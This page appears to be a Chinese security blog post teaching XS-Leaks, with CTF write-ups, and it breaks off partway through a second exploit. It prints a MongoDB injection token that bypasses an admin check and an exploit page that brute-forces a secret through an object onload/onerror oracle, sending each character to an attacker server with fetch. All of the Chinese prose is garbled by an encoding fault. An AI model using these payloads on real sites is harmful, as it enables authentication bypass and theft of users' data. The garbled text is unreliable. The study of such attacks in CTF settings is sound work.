

<!DOCTYPE html>
<html lang="en" color-mode=light>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>å‰ç«¯å®‰å…¨å¤§å¸ˆå…»æˆè®¡åˆ’Vol.01:XS-Leaks - Welcome to fallingblog</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="google" content="notranslate" />
  
  <meta name="description" content="å…³é”®è¯ï¼š ä¾§ä¿¡é“ï¼›è·¨åŸŸï¼›æ³„æ¼ä¿¡æ¯
å‰è¨€ä»CSRFåˆ°åŒæº...">
  <meta name="author" content="Ibukifalling">
  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
  
    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
    <meta rel="msapplication-TileColor" content="#000000">
  

  
<link rel="stylesheet" href="/css/style.css">


  
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">

  

  
    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">

  

  
    
      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">

      
        
        
<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">

      
  

  <script>
    var CONFIG = window.CONFIG || {};
    var ZHAOO = window.ZHAOO || {};
    CONFIG = {
      isHome: false,
      fancybox: true,
      pjax: false,
      lazyload: {
        enable: true,
        only_post: 'false',
        loading: '[object Object]'
      },
      donate: {
        enable: true,
        alipay: '/images/myimg/alipay.jpg',
        wechat: '/images/myimg/wechat.png'
      },
      galleries: {
        enable: true
      },
      fab: {
        enable: true,
        always_show: false
      },
      carrier: {
        enable: true
      },
      daovoice: {
        enable: false
      },
      preview: {
        background: {
          default: '',
          api: ''
        },
        motto: {
          default: 'æˆ‘åœ¨å¼€äº†ç¯çš„åºŠå¤´ä¸‹ï¼Œæƒ³é—®é—®è‡ªå·±çš„å¿ƒå•Šã€‚',
          typing: true,
          api: 'https://v2.jinrishici.com/one.json',
          data_contents: '["data","content"]'
        },
      },
      qrcode: {
        enable: true,
        type: 'url',
        image: 'https://pic.izhaoo.com/weapp-code.jpg',
      },
      toc: {
        enable: true
      },
      scrollbar: {
        type: 'default'
      },
      notification: {
        enable: false,
        delay: 4500,
        list: '',
        page_white_list: '',
        page_black_list: ''
      },
      search: {
        enable: false,
        path: ''
      }
    }
  </script>

  

  

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="lock-screen">
  <div class="loading"></div>
  
    


  <nav class="navbar">
    <div class="left">
      
        <i class="iconfont iconhome j-navbar-back-home"></i>
      
      
        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
      
      
        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
      
      
    </div>
    <div class="center">å‰ç«¯å®‰å…¨å¤§å¸ˆå…»æˆè®¡åˆ’Vol.01:XS-Leaks</div>
    <div class="right">
      <i class="iconfont iconmenu j-navbar-menu"></i>
    </div>
    
      <div id="qrcode-navbar"></div>
    
  </nav>

  
  

<nav class="menu">
  <div class="menu-container">
    <div class="menu-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <ul class="menu-content"><li class="menu-item">
        <a href="/ " class="underline "> é¦–é¡µ</a>
      </li><li class="menu-item">
        <a href="/galleries/ " class="underline "> æ‘„å½±</a>
      </li><li class="menu-item">
        <a href="/archives/ " class="underline "> å½’æ¡£</a>
      </li><li class="menu-item">
        <a href="/tags/ " class="underline "> æ ‡ç­¾</a>
      </li><li class="menu-item">
        <a href="/categories/ " class="underline "> åˆ†ç±»</a>
      </li><li class="menu-item">
        <a href="/about/ " class="underline "> å…³äº</a>
      </li></ul>
    
      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
    
  </div>
</nav>
  <main id="main">
  <div class="article-wrap">
    <div class="row container">
      <div class="col-xl-3"></div>
      <div class="col-xl-6"><article class="article">
  <div class="wrap">
    <section class="head">
  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
  <div class="head-mask">
    <h1 class="head-title">å‰ç«¯å®‰å…¨å¤§å¸ˆå…»æˆè®¡åˆ’Vol.01:XS-Leaks</h1>
    <div class="head-info">
      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 29, 2023</span>
      
      <span class="post-info-item"><i class="iconfont iconfont-size"></i>6423</span>
    </div>
  </div>
</section>
    <section class="main">
      <section class="content">
        <p>å…³é”®è¯ï¼š ä¾§ä¿¡é“ï¼›è·¨åŸŸï¼›æ³„æ¼ä¿¡æ¯</p>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><h2 id="ä»CSRFåˆ°åŒæºç­–ç•¥"><a href="#ä»CSRFåˆ°åŒæºç­–ç•¥" class="headerlink" title="ä»CSRFåˆ°åŒæºç­–ç•¥"></a>ä»CSRFåˆ°åŒæºç­–ç•¥</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæµè§ˆå™¨ä¾é jsæ­å»ºèµ·ç”¨æˆ·ä¸æœåŠ¡ç«¯ä¹‹é—´çš„æ¡¥æ¢ï¼Œæˆ‘ä»¬åœ¨ç½‘é¡µæ—¶ï¼Œç‚¹å‡»ä¸åŒçš„åŠŸèƒ½æŒ‰é’®ï¼Œjsè‡ªåŠ¨å‘æœåŠ¡ç«¯å‘èµ·å„ç§ä¸åŒçš„è¯·æ±‚ï¼Œæ„æˆäº†æˆ‘ä»¬æ—¥å¸¸ç½‘ä¸Šå†²æµªçš„èˆ’é€‚ä½“éªŒ<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>å½“ç„¶ï¼Œæ¶æ„çš„æ”»å‡»è€…ä¹Ÿå¯ä»¥ä¾é jsæ¥ä¼ªé€ ç”¨æˆ·äº¤äº’ï¼Œå®ç°CSRFæ”»å‡»ï¼Œä¸€ä¸ªç»å…¸çš„CSRFä¾‹å­å¦‚ä¸‹å›¾æ‰€ç¤º<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>å‡ºäºå®‰å…¨æ€§çš„è€ƒè™‘ï¼Œç°ä»£æµè§ˆå™¨åŸºæœ¬éƒ½å®ç°äº†åŒæºç­–ç•¥ï¼Œé™åˆ¶ä¸åŒç½‘ç«™ä¹‹é—´çš„æ•°æ®è¯»å–</p>
<p>ä¸¾ä¸ªæ —å­ğŸŒ°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨bç«™ä¸»é¡µé€šè¿‡æ§åˆ¶å°æ‰“å¼€ä¸€ä¸ªæ–°çš„bç«™è§†é¢‘çª—å£ï¼Œå¹¶ä¸”å¯ä»¥å–å¾—è¿™ä¸ªçª—å£çš„documentç­‰ä¿¡æ¯</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> MyWindow = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">&#x27;https://www.bilibili.com/video/BV1Mc411u7xh/&#x27;</span>)<br><br>MyWindow.document.title<br><span class="hljs-comment">//æ˜¾ç¤ºå¯¹åº”çš„æ ‡ç­¾é¡µtitle</span><br></code></pre></td></tr></table></figure>

<p>ä½†å½“æˆ‘ä»¬åœ¨ç™¾åº¦çš„ä¸»é¡µè¿›è¡Œä¸€æ ·çš„æ“ä½œæ—¶ï¼Œå´ä¼šPermission deniedï¼Œè¿™æ˜¯å› ä¸ºç™¾åº¦å’Œbç«™å¹¶ä¸åŒæºï¼ŒåŒæºç­–ç•¥é™åˆ¶äº†ä¸åŒç½‘ç«™ä¹‹é—´çš„æ•°æ®è¯»å–</p>
<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œè®©æ”»å‡»è€…æ— æ³•è½»æ˜“åœ°é€šè¿‡jsè„šæœ¬è·¨ç«™è·å¾—ä¿¡æ¯ï¼Œä¿æŠ¤äº†ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶çš„å®‰å…¨æ€§å’Œéšç§æ€§ï¼Œæ˜¯æµè§ˆå™¨å®‰å…¨çš„åŸºçŸ³(&lt;-è¿™ä¸€æ®µæ˜¯gptè¯´çš„)</p>
<h1 id="XS-Leaksç®€ä»‹"><a href="#XS-Leaksç®€ä»‹" class="headerlink" title="XS-Leaksç®€ä»‹"></a>XS-Leaksç®€ä»‹</h1><p>XS-Leaksï¼Œå³cross-site leaksï¼Œç›´è¯‘ä¸ºè·¨ç«™æ³„æ¼ï¼Œæ˜¯ä¸€ç±»åŸºäºæµè§ˆå™¨ç‰¹æ€§çš„ä¾§ä¿¡é“æ”»å‡»<br>è¯´åˆ°ä¾§ä¿¡é“æ”»å‡»ï¼Œå¤§å®¶åº”è¯¥æˆ–å¤šæˆ–å°‘éƒ½å¬è¿‡è¿™ä¸ªè¯ï¼Œä¹Ÿå¬è¿‡ä¾§ä¿¡é“æ”»å‡»çš„é€šä¿—è§£é‡Š-â€œä½ å¦ˆå›å®¶çœ‹åˆ°ä½ åœ¨å†™ä½œä¸šï¼Œå¾ˆé«˜å…´ï¼Œç»“æœæ‘¸ç”µè§†å‘ç°æ˜¯çƒ­çš„ï¼ŒæŠŠä½ æ‰“äº†ä¸€é¡¿â€ã€‚ä»å¹¿ä¹‰ä¸Šè¯´ï¼Œä¾§ä¿¡é“æ”»å‡»çš„æœ¬è´¨æ˜¯å¢åŠ è·å–ä¿¡æ¯çš„ç»´åº¦ï¼Œä»ä¸€äº›å®¹æ˜“è¢«å¿½è§†çš„åœ°æ–¹æ³„æ¼å‡ºå…³é”®ä¿¡æ¯<br>ä¸‹é¢ä»‹ç»XS-Leaksä¸­ä¸€ç§æ¯”è¾ƒç»å…¸çš„æ”»å‡»æ‰‹æ³•ï¼ŒXS-Searchï¼Œè®©å¤§å®¶å¯¹XS-Leaksæœ‰ä¸€ä¸ªåŸºæœ¬æ¦‚å¿µ</p>
<h2 id="XS-Search"><a href="#XS-Search" class="headerlink" title="XS-Search"></a>XS-Search</h2><p>è®¾æƒ³ç½‘ç«™æœ‰ä¸€ä¸ªæ¨¡ç³ŠæŸ¥æ‰¾åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªgetå‚æ•°å¯¹æ•°æ®è¿›è¡ŒæŸ¥è¯¢ï¼Œé‚£ä¹ˆè™½ç„¶æ”»å‡»è€…ç”±äºåŒæºç­–ç•¥çš„é™åˆ¶æ— æ³•ç›´æ¥å–å¾—æŸ¥è¯¢ç»“æœï¼Œä½†æ˜¯å´å¯ä»¥é€šè¿‡è¯·æ±‚å„è‡ªæ‰€èŠ±è´¹çš„æ—¶é—´æ¥åˆ¤æ–­æœç´¢æ˜¯å¦è¿”å›äº†ç»“æœï¼ˆå¾ˆè‡ªç„¶çš„æƒ³æ³•ï¼ŒæŸ¥è¯¢åˆ°ç»“æœçš„è¯·æ±‚ä¼šæ¯”æ²¡æŸ¥è¯¢åˆ°ç»“æœçš„è¯·æ±‚å“åº”æ—¶é—´æ›´é•¿ï¼‰ï¼Œç”±æ­¤æ³„æ¼å‡ºæ•°æ®ä¸­æ˜¯å¦åŒ…å«æŸäº›å…·ä½“å†…å®¹</p>
<blockquote>
<p>å°é³åŒå­¦å–œæ¬¢æŠŠé“¶è¡Œå¡å¯†ç å†™åœ¨æŸåœ¨çº¿ç¬”è®°é‡Œï¼Œå°èŒ¯åŒå­¦çŸ¥é“åå†™äº†ä¸€ä¸ªé’“é±¼ğŸ£ç½‘ç«™å‘ç»™å°é³ï¼Œé€šè¿‡ç¬”è®°çš„æœç´¢åŠŸèƒ½è¿›è¡ŒXS-Searchï¼Œä¸€ä½ä¸€ä½åœ°leakå‡ºå°é³åŒå­¦çš„é“¶è¡Œå¡å¯†ç ï¼Œå‘ç°æ˜¯è‡ªå·±çš„ç”Ÿæ—¥ã€‚</p>
</blockquote>
<p>ä¸Šè¿°æ¡ˆä¾‹å°±å±äºXS-Searchçš„å…¸å‹åº”ç”¨</p>
<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>ä¸è¿‡è¿™æ ·çš„æ”»å‡»æ–¹å¼æœ‰å¾ˆæ˜æ˜¾çš„ç¼ºç‚¹ï¼šåˆ©ç”¨æ¡ä»¶è‹›åˆ»<br>â— æ¯ä¸ªè¯·æ±‚èƒ½æ³„æ¼çš„ä¿¡æ¯å¾ˆæœ‰é™ï¼Œæƒ³è¦è·å¾—å…·ä½“çš„ä¿¡æ¯è¦å‘å‡ºå¤§é‡è¯·æ±‚<br>â— å¯¹å“åº”æ—¶é—´çš„å½±å“å› ç´ å¤ªå¤šå¤ªä¸ç¨³å®šï¼Œæ¯”å¦‚ç½‘ç»œæŠ–åŠ¨å’Œç½‘ç»œå»¶è¿Ÿï¼ˆè™½ç„¶æœ‰timeless timingç­‰æŠ€å·§å¯ä»¥å‡å°‘å½±å“ï¼Œä½†ä¾ç„¶æ— æ³•æ”¹å˜åˆ©ç”¨æ¡ä»¶è‹›åˆ»çš„äº‹å®ï¼‰</p>
<p>è¯è™½å¦‚æ­¤ï¼ŒXS-Searchå´ä¸ºæˆ‘ä»¬æ‰“å¼€äº†ä¸€ç§æ”»å‡»æ€è·¯ï¼Œå¹¶ä¸”XS-Leaksçš„å®é™…æ”»å‡»æ‰‹æ®µä¹Ÿè¿œä¸æ­¢å¦‚æ­¤</p>
<h2 id="ä¸€äº›CTFé¢˜ç›®"><a href="#ä¸€äº›CTFé¢˜ç›®" class="headerlink" title="ä¸€äº›CTFé¢˜ç›®"></a>ä¸€äº›CTFé¢˜ç›®</h2><h3 id="2021ç¥¥äº‘æ¯-Package-Manager-2021"><a href="#2021ç¥¥äº‘æ¯-Package-Manager-2021" class="headerlink" title="[2021ç¥¥äº‘æ¯]Package Manager 2021"></a>[2021ç¥¥äº‘æ¯]Package Manager 2021</h3><p>buuojä¸Šæœ‰åœ¨çº¿ç¯å¢ƒ</p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]Package%20Manager%202021">https://buuoj.cn/challenges#[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]Package%20Manager%202021</a><br>è¿™ä¸ªé¢˜çš„å¸¸è§„è§£æ³•æ˜¯mongoDBæ³¨å…¥ï¼Œä¸è¿‡è¿˜æœ‰ä¸€ä¸ªç”»è›‡æ·»è¶³çš„xsleakåšæ³•ï¼ˆä¸ºä»€ä¹ˆè¯´æ˜¯ç”»è›‡æ·»è¶³å‘¢ï¼Œå› ä¸ºç”¨xsleakåšä¹Ÿè¿˜æ˜¯éœ€è¦æ³¨å…¥ï¼‰ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹xsleakéƒ¨åˆ†çš„æ€è·¯<br>é¢˜ç›®æ˜¯ä¸€ä¸ªpackageç®¡ç†é¡µï¼Œå¯ä»¥è‡ªå·±æ·»åŠ packageï¼Œflagæ˜¯adminç”¨æˆ·çš„ä¸€ä¸ªpackageå†…å®¹<br><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>é¢˜ç›®é‡Œæœ‰ä¸€ä¸ªsearchåŠŸèƒ½<br>/packages/list?search=alibaba </p>
<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>/packages/list?search=40thieves</p>
<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<p>æ³¨æ„åˆ°æœç´¢æˆåŠŸå’Œå¤±è´¥æ—¶è¿”å›çš„çŠ¶æ€ç ä¸åŒï¼ˆ200å’Œ404ï¼‰ï¼Œå¯ä»¥ä»¥æ­¤ä½œä¸ºä¾§ä¿¡é“è¿›è¡Œleak<br>è§£é¢˜<br>é¦–å…ˆéœ€è¦æäº¤ä¸€ä¸ªæ ¡éªŒtokenæ‰èƒ½å‘adminå‘é€urlï¼Œæ ¡éªŒæ—¶ä»mongoDBæŸ¥è¯¢ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­tokenæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè™½ç„¶æœ‰æ­£åˆ™åŒ¹é…tokenå¿…é¡»æ˜¯md5æ ¼å¼ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰å†™^$æ‰€ä»¥å¯ä»¥ç›´æ¥å¡32ä¸ªaè¿›è¡Œç»•è¿‡ï¼ˆæ³¨å…¥çš„åšæ³•å°±æ˜¯åœ¨è¿™é‡Œç›´æ¥æ³¨å‡ºå¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜è¦æ‰“xsleakï¼Œå°±å…ˆæ”¾å¯†ç ä¸€é©¬ï¼‰<br>è¾“å…¥å¦‚ä¸‹tokenï¼Œæ„é€ æ°¸çœŸå¼é€šè¿‡æ ¡éªŒ<br><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||this.username==&quot;admin</code></p>
<blockquote>
<p>é¢˜å¤–è¯ï¼Œè¿™é‡Œå¦‚æœæ”¹æˆ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaâ€||â€aâ€==â€a æ˜¯æ— æ³•é€šè¿‡æ ¡éªŒçš„ï¼Œwhyï¼Ÿ</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ›å»ºä¸€ä¸ªpackageå‘é€ç»™adminäº†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">res.set(<span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);<br>res.set(<span class="hljs-string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="hljs-string">&#x27;nosniff&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºé¢˜ç›®CSPåšäº†éå¸¸ä¸¥æ ¼çš„é™åˆ¶ï¼Œå¸¸è§„çš„xssåŸºæœ¬ä¸Šå…¨éƒ½æ‰“ä¸é€šï¼Œèƒ½ä½¿ç”¨çš„åŸºæœ¬ä¸Šåªæœ‰ä¸€ä¸ªmetaæ ‡ç­¾é‡å®šå‘ï¼Œåªèƒ½è€ƒè™‘xsleak<br>åœ¨ç«ç‹ç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨objectå…ƒç´ çš„onloadå’Œonerroräº‹ä»¶è¿›è¡Œleakï¼Œå¦‚æœobject.dataçš„è®¿é—®çŠ¶æ€ç ä¸º200ï¼Œåˆ™ä¼šè§¦å‘onloadï¼Œå¦‚æœè®¿é—®çŠ¶æ€ç ä¸º404ï¼Œåˆ™ä¼šè§¦å‘onerror</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs htmlmixed">&lt;html&gt;<br>  &lt;script&gt;<br>    const VPS_IP = &#x27;http://111.111.111.111/&#x27;<br>    const chars = &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;;<br><br>    const escape = (c) =&gt; &#123;<br>      return c.replace(/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g, &#x27;\\$&amp;&#x27;);<br>    &#125;<br><br>    const oracle = async (url) =&gt; &#123;<br>      return new Promise((resolve, reject) =&gt; &#123;<br>        const object = document.createElement(&quot;object&quot;);<br>        object.data = url;<br>        object.onload = resolve;<br>        object.onerror = reject;  <br>        document.head.appendChild(object);<br>      &#125;);<br>    &#125;<br>    const search = async (url) =&gt; &#123;<br>      try &#123;<br>        await oracle(url)<br>        return true;<br>      &#125; catch (e) &#123;<br>        return false;<br>      &#125;<br>    &#125;<br><br>      (async () =&gt; &#123;<br>        let flag = &#x27;&#x27;;<br>        let url = `http://localhost:8888/packages/list?search[description][$regex]=^$&#123;flag&#125;`<br>        while (flag.charAt(flag.length - 1) !== &quot;&#125;&quot;) &#123;<br>          for ( let i of chars ) &#123;<br>            if ( await(search(url + escape(i))) ) &#123;<br>              url = url + escape(i)<br>              flag += i<br>              await fetch(`$&#123;VPS_IP&#125;/?flag=$&#123;flag&#125;`, &#123;mode: &#x27;no-cors&#x27;&#125;)<br>              break;<br>            &#125;   else &#123;<br>              console.log(&#x27;failed&#x27;);<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;)();<br>  &lt;/script&gt;<br>  &lt;img src=&quot;https://deelay.me/10000/http://example.com&quot;/&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p><img   class="lazyload" data-original="https://ibukifalling-imagebed.oss-cn-beijing.aliyuncs.com/image/xsleak8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
<h3 id="SUSCTF-2022-ez-notes"><a href="#SUSCTF-2022-ez-notes" class="headerlink" title="[SUSCTF 2022] ez_notes"></a>[SUSCTF 2022] ez_notes</h3><p>å’Œä¸Šé¢ä¸€é¢˜å¤§åŒå°å¼‚ï¼Œå¯ä»¥åˆ›å»ºnotesï¼Œnotesæœ‰æœç´¢åŠŸèƒ½ï¼Œå¯ä»¥ç»™adminå‘é€urlï¼Œflagæ˜¯adminçš„ä¸€ä¸ªnote</p>
<p>æœç´¢åŠŸèƒ½åœ¨æœç´¢åˆ°å”¯ä¸€ç»“æœæ—¶ä¼šè¿›è¡Œä¸€æ¬¡è·³è½¬ï¼Œå¯ä»¥ä»¥æ­¤ä¸ºä¾§ä¿¡é“è¿›è¡Œleak</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (data.length === <span class="hljs-number">1</span>)  <span class="hljs-comment">// ä»…æœ‰ä¸€æ¡ç»“æœ</span><br>&#123;<br>  <span class="hljs-keyword">let</span> url = <span class="hljs-string">&#x27;/view/&#x27;</span> + data[<span class="hljs-number">0</span>].id<br>  res.send(<span class="hljs-string">&#x27;find only match, redirecting&lt;script&gt;setTimeout(function()&#123;location.href=&quot;&#x27;</span> + url + <span class="hljs-string">&#x27;&quot;&#125;,1000) &lt;/script&gt;&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…·ä½“çš„leakæ–¹æ³•æ˜¯ï¼šjsæ‰“å¼€çš„çª—å£ä¼šå­˜æœ‰ä¸€ä¸ªhistoryå±æ€§ï¼Œè™½ç„¶åœ¨ä¸åŒæºæ—¶æ— æ³•æŸ¥çœ‹ï¼Œä½†æ˜¯å¯ä»¥å°†çª—å£åˆ‡å›åŒæºé¡µé¢åé€šè¿‡historyçš„é•¿åº¦åˆ¤æ–­æ˜¯å¦è¿›è¡Œäº†è·³è½¬ï¼Œè·³è½¬è¿‡çš„windowä¼šæœ‰æ›´é•¿çš„history</p>
<p>exp</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">exp()</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exp</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">let</span> charset = <span class="hljs-string">&quot;1234567890_qwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="javascript">      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> charset)&#123;</span><br><span class="javascript">        test(c)</span><br><span class="javascript">      &#125;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params">c</span>) </span>&#123;</span><br><span class="javascript">      <span class="hljs-keyword">let</span> win = open(<span class="hljs-string">&quot;http://120.53.107.60:3456/search?q=flag&#123;&quot;</span>+ c )</span><br><span class="javascript">  <span 